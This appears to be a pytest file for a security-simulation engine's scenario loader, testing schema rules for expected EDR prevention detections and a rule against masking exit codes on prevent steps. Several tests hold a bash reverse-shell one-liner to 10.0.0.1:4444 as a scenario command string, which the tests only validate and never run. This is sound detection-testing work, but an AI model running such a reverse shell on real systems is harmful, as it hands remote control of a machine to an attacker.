from pathlib import Path

import pytest
import yaml

from engine.scenario_loader import StepExpectedDetection, StepSchema, DETECTION_TYPES

FIXTURE = Path(__file__).resolve().parent.parent / "fixtures" / "scenarios" / "sim-test-prev-001.yml"


def _det(**kw):
    base = dict(plane="EDR", type="Prevention", description="d", ttp_ref="TTP-2026-9901",
                detection_id="prevention-btp-reverse-shell-from-web-server")
    base.update(kw); return base

def test_prevention_is_a_detection_type():
    assert "Prevention" in DETECTION_TYPES

def test_prevention_modules_vocabulary():
    from engine.scenario_loader import PREVENTION_MODULES
    assert PREVENTION_MODULES == frozenset({
        "btp", "exploit_protection", "local_analysis", "wildfire",
        "anti_ransomware", "credential_protection", "device_control", "host_firewall"})

def test_prevent_requires_prevention_type_and_runtime_plane():
    StepExpectedDetection(**_det(outcome="prevent"))
    with pytest.raises(ValueError, match="outcome: prevent requires type: Prevention"):
        StepExpectedDetection(**_det(type="BIOC", detection_id="bioc-x", outcome="prevent"))
    with pytest.raises(ValueError, match="EDR or CDR"):
        StepExpectedDetection(**_det(plane="NDR", outcome="prevent"))

def test_prevention_type_with_detect_outcome_is_legal():
    d = StepExpectedDetection(**_det(outcome="detect"))
    assert d.outcome == "detect"

def test_outcome_defaults_to_detect_and_rejects_unknown():
    assert StepExpectedDetection(**_det()).outcome == "detect"
    with pytest.raises(ValueError, match="outcome"):
        StepExpectedDetection(**_det(outcome="block"))

def test_prevention_slug_prefix_enforced():
    with pytest.raises(ValueError, match="prevention-"):
        StepExpectedDetection(**_det(detection_id="bioc-something"))

def test_prevention_without_detection_id_is_allowed():
    StepExpectedDetection(**_det(detection_id=None))

def test_prevent_step_may_not_mask_exit():
    step = dict(id="s1", name="n", identity="www-data", mitre_technique="T1059.004",
                expected_detections=[_det(outcome="prevent")])
    StepSchema(command="exec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", **step)
    with pytest.raises(ValueError, match="S-21"):
        StepSchema(command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 || true", **step)

def test_detect_step_may_mask_exit():
    step = dict(id="s1", name="n", identity="www-data", mitre_technique="T1059.004",
                expected_detections=[_det(outcome="detect")])
    StepSchema(command="id || true", **step)

def test_fixture_scenario_is_accepted():
    from engine.scenario_loader import ScenarioSchema
    ScenarioSchema(**yaml.safe_load(FIXTURE.read_text()))


@pytest.mark.parametrize("mask", ["|| :", "|| exit 0", "|| /bin/true", "|| printf 'x'"])
def test_prevent_step_rejects_additional_masks(mask):
    step = dict(id="s1", name="n", identity="www-data", mitre_technique="T1059.004",
                expected_detections=[_det(outcome="prevent")])
    with pytest.raises(ValueError, match="S-21:"):
        StepSchema(command=f"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 {mask}", **step)
    detect = dict(step, expected_detections=[_det(outcome="detect")])
    StepSchema(command=f"bash -i {mask}", **detect)
